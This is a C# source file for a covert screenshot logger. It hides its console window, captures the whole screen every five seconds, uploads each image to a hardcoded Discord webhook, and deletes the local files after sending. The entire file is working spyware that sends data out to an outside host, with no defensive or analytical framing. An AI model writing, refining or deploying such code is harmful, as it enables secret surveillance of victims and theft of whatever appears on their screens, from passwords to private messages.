using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

class HiddenScreenshotLogger
{
    private static readonly string webhookUrl = "https://discord.com/api/webhooks/1351188791842308226/JADJxnROfbwS1wubbiDp6sNadbC94v1wpKLPHKfTBHCcPTXw7KxRF-H7AFIxTqSkKg2U"; // Replace with your webhook URL

    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    private const int SW_HIDE = 0;

    static void Main()
    {
        // Hide the console window
        IntPtr handle = GetConsoleWindow();
        if (handle != IntPtr.Zero) ShowWindow(handle, SW_HIDE);

        string screenshotDir = "C:\\Temp\\screenshots";
        Directory.CreateDirectory(screenshotDir); // Ensure folder exists

        while (true)
        {
            string screenshotPath = CaptureScreenshot(screenshotDir);
            if (!string.IsNullOrEmpty(screenshotPath))
            {
                Task.Run(async () =>
                {
                    bool sent = await SendToDiscord(screenshotPath);
                    if (sent)
                    {
                        File.Delete(screenshotPath); // Auto-delete after sending
                        Console.WriteLine($"Deleted: {screenshotPath}");

                        // Force garbage collection to clear RAM
                        GC.Collect();
                        GC.WaitForPendingFinalizers();
                    }
                });
            }
            Thread.Sleep(5000); // Wait 10 seconds
        }
    }

    static string CaptureScreenshot(string savePath)
    {
        try
        {
            using (Bitmap screenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height))
            {
                using (Graphics g = Graphics.FromImage(screenshot))
                {
                    g.CopyFromScreen(0, 0, 0, 0, screenshot.Size);
                }

                string filePath = Path.Combine(savePath, $"screenshot_{DateTime.Now:yyyyMMdd_HHmmss}.png");
                screenshot.Save(filePath, ImageFormat.Png);
                return filePath;
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error capturing screenshot: " + ex.Message);
            return null;
        }
    }

    static async Task<bool> SendToDiscord(string filePath)
    {
        try
        {
            using (HttpClient client = new HttpClient())
            {
                using (MultipartFormDataContent form = new MultipartFormDataContent())
                {
                    form.Add(new ByteArrayContent(File.ReadAllBytes(filePath)), "file", Path.GetFileName(filePath));
                    HttpResponseMessage response = await client.PostAsync(webhookUrl, form);
                    return response.IsSuccessStatusCode;
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error sending to Discord: " + ex.Message);
            return false;
        }
    }
}
